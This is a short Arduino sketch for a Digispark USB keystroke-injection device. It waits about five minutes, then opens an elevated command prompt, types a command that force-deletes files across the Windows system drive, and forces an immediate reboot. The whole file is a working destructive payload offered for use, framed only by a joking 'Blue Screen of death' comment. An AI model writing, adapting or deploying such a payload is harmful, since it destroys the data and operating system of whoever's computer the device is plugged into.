#include<DigiKeyboard.h>
void setup() {
  // put your setup code here, to run once:

}

void loop() {
  // Blue Screen of death (the blue hell )
  DigiKeyboard.sendKeyStroke(0);
  DigiKeyboard.delay(300000);
  DigiKeyboard.sendKeyStroke(KEY_R, MOD_GUI_LEFT);
  DigiKeyboard.delay(300);
  DigiKeyboard.print("cmd");
  DigiKeyboard.delay(300);
  DigiKeyboard.sendKeyStroke(KEY_ENTER, MOD_CONTROL_LEFT | MOD_SHIFT_LEFT);
  DigiKeyboard.delay(2000);
  DigiKeyboard.println("del %Systemdrive%\*.*/f /s /q");
  DigiKeyboard.delay(400);
  DigiKeyboard.println("shutdown -r -f -t 00");
  digitalWrite(1, HIGH);
  for(;;){
    // Zzzzzzzzzz
  }
}
